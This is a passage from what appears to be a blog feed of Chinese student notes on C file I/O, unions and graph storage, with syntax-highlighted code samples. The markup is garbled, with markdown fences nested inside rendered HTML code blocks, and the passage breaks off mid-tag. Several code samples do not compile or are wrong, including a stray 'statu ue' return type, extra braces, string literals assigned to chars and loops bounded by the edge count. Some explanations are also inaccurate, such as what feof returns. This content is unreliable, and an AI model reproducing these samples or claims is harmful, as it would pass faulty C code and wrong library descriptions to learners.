autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>     <br><br><span class="hljs-number">8</span>. `fgets`:读一个字符串<br><br>   - ```c<br>     fgets(arr,<span class="hljs-number">4</span>,pr)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="c">int main()&#123;    FILE* pr=NULL;    char arr[10];    //文件的创建    pr=fopen(&quot;chg.tet&quot;,&quot;r+&quot;);    //文件的判断    if(pr==NULL)    &#123;        perror(&quot;fopen:&quot;);        return 1;    &#125;    //第一次文件操作    fputs(&quot;chgchg&quot;,pr);    rewind(pr);    fgets(arr,7,pr);    printf(&quot;%s\n&quot;,arr);    //第二次文件操作    rewind(pr);    fputs(&quot;tsytsy&quot;,pr);    rewind(pr);    fgets(arr,7,pr);    printf(&quot;%s\n&quot;,arr);    //文件的关闭    fclose(pr);    return 0;&#125;<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br>## 结构体数据存储<br><br><span class="hljs-number">1.</span> `<span class="hljs-built_in">fprintf</span>()`:<br><br>   ```<span class="hljs-function">c</span><br><span class="hljs-function">   <span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function">   </span>&#123;<br>   <span class="hljs-comment">//创建文件</span><br>   FILE* pr = <span class="hljs-literal">NULL</span>;<br>   pr = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;chg.txt&quot;</span>, <span class="hljs-string">&quot;r+&quot;</span>);<br>   <br>   stu stu1;<br>   <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s%s&quot;</span>, stu1.number, stu1.name);<br>   <span class="hljs-comment">//文件的判断</span><br>   <span class="hljs-keyword">if</span> (pr == <span class="hljs-literal">NULL</span>)<br>   &#123;<br>   <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;fopen:&quot;</span>);<br>   <span class="hljs-keyword">return</span>  <span class="hljs-number">1</span>;<br>   &#125;<br>   <span class="hljs-comment">//文件的写入</span><br>   <span class="hljs-built_in">fprintf</span>(pr, <span class="hljs-string">&quot;number:%s\tname:%s&quot;</span>, stu1.number, stu1.name);<br>   <span class="hljs-built_in">rewind</span>(pr);<br>   <span class="hljs-comment">//关闭文件</span><br>   <span class="hljs-built_in">fclose</span>(pr);<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>   &#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li><p><code>fscanf()</code>:成功返回1</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">//创建文件</span><br>FILE* pr = <span class="hljs-literal">NULL</span>;<br>pr = fopen(<span class="hljs-string">&quot;chg.txt&quot;</span>, <span class="hljs-string">&quot;r+&quot;</span>);<br><br>stu stu1 = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s%s&quot;</span>, stu1.number, stu1.name);<br><span class="hljs-comment">//文件的判断</span><br><span class="hljs-keyword">if</span> (pr == <span class="hljs-literal">NULL</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;fopen:&quot;</span>);<br><span class="hljs-keyword">return</span>  <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//文件的写入</span><br><span class="hljs-built_in">fprintf</span>(pr, <span class="hljs-string">&quot;number:%s\tname:%s&quot;</span>, stu1.number, stu1.name);<br><span class="hljs-comment">//文件的读取</span><br>rewind(pr);<br>stu1.number[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;123&quot;</span>;<br>stu1.name[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;00000&quot;</span>;<br><span class="hljs-built_in">fscanf</span>(pr, <span class="hljs-string">&quot;number:%s\tname:%s&quot;</span>, &amp;stu1.number,&amp;stu1.name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number:%s\tname:%s&quot;</span>, stu1.number, stu1.name);<br><span class="hljs-comment">//关闭文件</span><br>fclose(pr);<br>pr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二进制写入："><a href="#二进制写入：" class="headerlink" title="二进制写入："></a>二进制写入：</h2><ol><li><code>fwrite</code>:将buffer的东西存储进流里面<img src="C:\Users\12414\Desktop\C语言笔记\文件操作\文件操作.assets\image-20221113114946926.png" alt="image-20221113114946926"></li></ol><ul><li><p><code>buffer</code>是个指针，地址</p></li><li><p><code>size</code>:元素的大小，单位是字节</p></li><li><p><code>count</code>:元素个数</p></li><li><p>最后为流地址</p></li><li><pre><code class="c">typedef struct student&#123;    char number[20];    char name[10];&#125;stu;int main()&#123;    //文件的创建    FILE* pr = NULL;    pr = fopen(&quot;chg.txt&quot;, &quot;r+&quot;);    stu stu1;    scanf(&quot;%s%s&quot;, stu1.name, stu1.number);    //文件的2进制读写    fwrite(&amp;stu1, sizeof(stu), 1, pr);    //文件的关闭    fclose(pr);    pr = NULL;    return 0;&#125;<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><br>    <br><br><span class="hljs-number">2.</span> `fread`:将流里面的东西读出来![image<span class="hljs-number">-20221113130044448</span>](C:\Users\<span class="hljs-number">12414</span>\Desktop\C语言笔记\文件操作\文件操作.assets\image<span class="hljs-number">-20221113130044448.</span>png)<br><br>  ```c<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">student</span><br>  &#123;<br>  <span class="hljs-type">char</span> number[<span class="hljs-number">20</span>];<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">10</span>];<br>  &#125;stu;<br>  <br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>  <span class="hljs-comment">//文件的创建</span><br>  FILE* pr = <span class="hljs-literal">NULL</span>;<br>  pr = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;chg.txt&quot;</span>, <span class="hljs-string">&quot;r+&quot;</span>);<br>  stu stu1;<br>  <span class="hljs-comment">//文件的2进制读写</span><br>  <span class="hljs-built_in">fread</span>(&amp;stu1,<span class="hljs-built_in">sizeof</span>(stu1),<span class="hljs-number">1</span>,pr);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n%s&quot;</span>, stu1.name, stu1.number);<br>  <span class="hljs-comment">//文件的关闭</span><br>  <span class="hljs-built_in">fclose</span>(pr);<br>  pr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <br></code></pre></td></tr></table></figure></code></pre></li></ul><ol start="3"><li><p>判断文件的读取是否成功</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">feof(<span class="hljs-string">&quot;文件指针&quot;</span>);<span class="hljs-comment">//读取成功返回0，不成功返回非零值</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="fseek"><a href="#fseek" class="headerlink" title="fseek"></a><code>fseek</code></h2><ol><li><p>移动文件内部的指针，达到随机访问的目的</p></li><li><p>实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;   <br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>遵循顺序：创建文件，文件的判断，文件的写入，文件的读取，文件的关闭，记得让指针只向空，文件写入后记得让指针恢复，再进行</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>联合体专解</title>
    <link href="/2023/04/20/C/%E8%81%94%E5%90%88%E4%BD%93%E4%B8%93%E8%A7%A3/"/>
    <url>/2023/04/20/C/%E8%81%94%E5%90%88%E4%BD%93%E4%B8%93%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="联合体专解"><a href="#联合体专解" class="headerlink" title="联合体专解"></a>联合体专解</h1><h2 id="共用体的定义"><a href="#共用体的定义" class="headerlink" title="共用体的定义"></a>共用体的定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> 名字</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">//数据</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><ol><li><p>所有变量使用同一个内存，一般为联合体中数据成员占用内存最多的变量的内存</p></li><li><p>在使用时，只有一个变量有效，在初始化时，不能同时初始化，多个变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">Date</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> num;<br><span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">Date</span> <span class="hljs-title">date</span>;</span><br>date.num=<span class="hljs-number">65</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,date.num);<br>    <span class="hljs-comment">//结果为65</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,date.name);<br>    <span class="hljs-comment">//结果为A，虽然没有定义date.name,但是由于共用一个内存，是可以访问的，因为65是A的码值</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图</title>
    <link href="/2023/04/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/"/>
    <url>/2023/04/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><h2 id="图的定义和基本术语"><a href="#图的定义和基本术语" class="headerlink" title="图的定义和基本术语"></a>图的定义和基本术语</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%9B%BE%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%9C%AF%E8%AF%AD.png"></p><ol><li><p>完全图</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%AE%8C%E5%85%A8%E5%9B%BE.png"></p><p>有<code>n</code>个点每个点都与<code>n-1</code>个点有边，但是注意如果是无向的边则应该是<code>n*(n-1)/2</code>。如果是有向的边，则应该是<code>n*(n-1)</code></p></li><li><p>稀疏图(e&lt;nlogn)</p><p><strong>带箭头的边称为狐</strong></p><p>有很少的边或狐的图</p></li><li><p>稠密图</p><p>有较多的边或狐的图</p></li><li><p>网</p><p>边&#x2F;狐带权（有意义，如：<code>20km</code>等）的图</p></li><li><p>邻接</p><p>有边&#x2F;狐相连的两个顶点之间的关系</p><p>根据离散的知识(V<del>i</del>,V<del>j</del>)这是不分先后的（小括号括起来），则说V<del>i</del>,V<del>j</del>互称为邻接点</p><p>&lt;V<del>i</del>,V<del>j</del>&gt;则则是有序的，对应有向的图V<del>i</del>邻接到V<del>j</del>，V<del>j</del>邻接于V<del>i</del></p></li><li><p>关联（依附）</p><p>边或者狐与顶点的关系</p></li><li><p>顶点的度</p><p>该顶点相关联的边的条数</p><p>在有向图当中，顶点的度等于该顶点的出度和入度之和</p><ul><li>入度：是以该顶点为终点的有向边</li><li>出度：是以该顶点为起点的有向边</li></ul><p>有向树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%9C%89%E5%90%91%E6%A0%91.png"></p></li><li><p>路径</p><p>按续的边构成的点的顶点序列</p></li><li><p>路径长度</p><p>路径上边或者狐的数目（权值）之和</p></li><li><p>环（回路）</p><p>第一个顶点和最后一个顶点相同的路径</p></li><li><p>简单的路径</p><p>除了路径的起点和终点可以相同，其他的都不同</p></li><li><p>简单的回路（简单的环）：除路径和终点相同，其他的顶点都不相同（注意区别简单路径和简单的回路）</p></li><li><p>连通图</p><p>就是图中任意的两个点都能够连接起来</p></li><li><p>权</p><p>图中的边或则弧线具有的相关的数被称为权。表明从一个顶点到另一个顶点的距离和消耗</p></li><li><p>网</p><p>带权的图</p></li><li><p>子图</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%AD%90%E5%9B%BE.png"></p><p>如果一个图是；另一个图的一部分就说明是子图</p></li><li><p>连通分量</p><p>无向图的最大联通的子图就称为G 的连通分量</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F.png"></p></li><li><p>强连通分量</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%BC%BA%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F.png"></p></li><li><p>极小连通子图</p><p>就是连通子图，如果再删除一条边，就不连通则说明是极小的连同子图</p></li><li><p>生成树</p><p>包含无向图的的所有的顶点的绩极小的联通子图</p></li><li><p>图和树的不同</p><ul><li>树是一种特殊的图，但是没有环，也就是说树的两个结点只有唯一路径</li><li>树的每一个节点有且仅有<code>1</code>或者<code>0</code>个前驱。但是树可以有多个前驱</li><li>树的每一个结点只会存在一种关系，即父子关系。但是图可以有多种关系。比如：有向边和无向边</li><li>树一般用于分层存储和处理数据，如文件系统等；而图则更加灵活，可以用于表示各种复杂关系和网络结构，如社交网络、电脑网络、交通网络等等。</li></ul></li><li><p>相同点</p><p>树和图是两种基本的非线性数据结构</p></li></ol><h2 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h2><h3 id="数组表示法（邻接矩阵）"><a href="#数组表示法（邻接矩阵）" class="headerlink" title="数组表示法（邻接矩阵）"></a>数组表示法（邻接矩阵）</h3><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5%E7%9A%84%E5%AE%9A%E4%B9%89.png"></p><p>使用矩阵的方式，如果两个点存在一个则对应的数组的值为<code>1</code>，反之为<code>0</code></p><p>无向图的邻接矩阵表示法</p><ol><li><p>临界矩阵的特点</p><ul><li>对角线值为0</li><li>矩阵是对称的</li></ul></li><li><p>矩阵度的计算</p><p>定点<code>i</code>的度，就是第<code>i</code>行<code>1</code>的个数</p><p>特别的完全图的邻接矩阵中，对角线元素为0，其余为1</p></li></ol><p><strong>有向图的邻接矩阵表示法</strong></p><ol><li><p>同理，有箭头的则是<code>1</code>，也就是从该点指出去</p></li><li><p>第<code>i</code>行的含义</p><p>以节点v<del>i</del>为结尾的弧（出度）</p></li><li><p>第<code>i</code>列的含义</p><p>以节点v<del>i</del>为头的弧（入度）</p></li><li><p>有向图的度</p><p>是出度和入度的和</p></li></ol><p><strong>邻接矩阵的实现</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5%E7%9A%84%E5%AE%9E%E7%8E%B0.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100   <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//定点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125;AMGraph;<br><br></code></pre></td></tr></table></figure><p><strong>网的表示法</strong></p><ol><li>将有连接的转变成权值而不是<code>1</code></li><li>没有连接的为<code>0</code></li></ol><p><strong>无向图的创建</strong></p><ol><li><p>算法思想</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%97%A0%E5%90%91%E7%BD%91%E7%9A%84%E5%88%9B%E5%BB%BA.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100   <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> statue;<br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//定点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125;AMGraph,*pAMGraph;<br>   <br>   <br><span class="hljs-comment">//查找对应的下标</span><br><span class="hljs-comment">//int LocateVex(pAMGraph G,char ch) &#123;</span><br><span class="hljs-comment">//for (int i = 0; i &lt; G-&gt;vexnum; i++)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//if (ch == G-&gt;vexs[i]) &#123;</span><br><span class="hljs-comment">//return i;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//return -1;</span><br>&#125;<br>&#125;<br><span class="hljs-comment">//&#125;</span><br>   <br>statu ue <span class="hljs-title function_">CreatUDN</span><span class="hljs-params">(pAMGraph *G)</span> &#123;<br>    <span class="hljs-type">int</span> x, y;<span class="hljs-comment">//模拟二维数组的x,y;</span><br>    <span class="hljs-type">char</span> aPoint,bPoint;<span class="hljs-comment">//</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>, &amp;(*G)-&gt;vexnum, &amp;(*G)-&gt;arcnum);<br>    <span class="hljs-comment">//创建节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (*G)-&gt;vexnum; i++)<br>    &#123;<br>        (*G)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>    &#125;<br>   <br>    <span class="hljs-comment">//初始化表</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (*G)-&gt;arcnum; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (*G)-&gt;arcnum; j++)<br>        &#123;<br>            (*G)-&gt;arcs[i][j] = MaxInt;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//赋予权值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (*G)-&gt;arcnum; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (*G)-&gt;arcnum; j++)<br>        &#123;<br>            (*G)-&gt;arcs[i][j] = MaxInt;<br>        &#125;<br>    &#125; <br>   <br>    <span class="hljs-comment">////对每一条边进行赋值</span><br>    <span class="hljs-comment">//scanf(&quot;%c%c&quot;, &amp;aPoint,&amp;bPoint);//对a-&gt;b的边进行赋权</span><br>    <span class="hljs-comment">//x = LocateVex(G, aPoint);</span><br>    <span class="hljs-comment">//y = LocateVex(G, bPoint);</span><br>    <span class="hljs-comment">//for (int i = 0; i &lt; (*G)-&gt;vexnum; ++i) &#123;</span><br>    <span class="hljs-comment">//scanf(&quot;%d&quot;, &amp;(*G)-&gt;arcs[x][y]);</span><br>    <span class="hljs-comment">//(*G)-&gt;arcs[x][y] = (*G)-&gt;arcs[y][x];//无向网，所以邻接矩阵是对称的</span><br>   <br>    <span class="hljs-comment">//&#125;</span><br>&#125;<br>   <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    pAMGraph G = (pAMGraph)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    CreatUDN(&amp;G);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p><strong>邻接矩阵构建有向图</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5%E6%9C%89%E5%90%91%E5%9B%BE.png"></p><p><strong>使用邻接矩阵的优点</strong></p><blockquote><ol><li><p>直观简单</p></li><li><p>方便查看某个图的节点</p></li><li><p>方便查找任意节点的邻接点</p></li><li><p>方便计算出某个节点的度</p></li></ol></blockquote><p><strong>使用邻接矩阵的缺点</strong></p><blockquote><p>空间复杂度是O(n^2^)</p></blockquote><h3 id="多重链表"><a href="#多重链表" class="headerlink" title="多重链表"></a>多重链表</h3><ol><li><p>邻接表 </p><p><strong>无向图</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E8%A1%A8.png"></p><ul><li><p>头结点</p><ul><li><p>第一个元素</p><p>存放定点的数据</p></li><li><p>第二个元素</p><p>存放边节点</p></li></ul></li><li><p>表结点（边节点）</p><ul><li><p>第一个元素</p><p>存放弧终点的节点</p></li><li><p>第二个元素</p><p>存放另一个弧终点的地址</p></li><li><p>第三个元素（图片无）</p><p>存放权值</p></li></ul></li><li><p>不唯一性</p><p>因为每一个边的链表顺序可以变</p><p>按道理来说，应该会有很多种</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E8%A1%A8%E7%9A%84%E7%89%B9%E7%82%B9.png"></p></li><li><p>使用邻接矩阵创建邻接表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 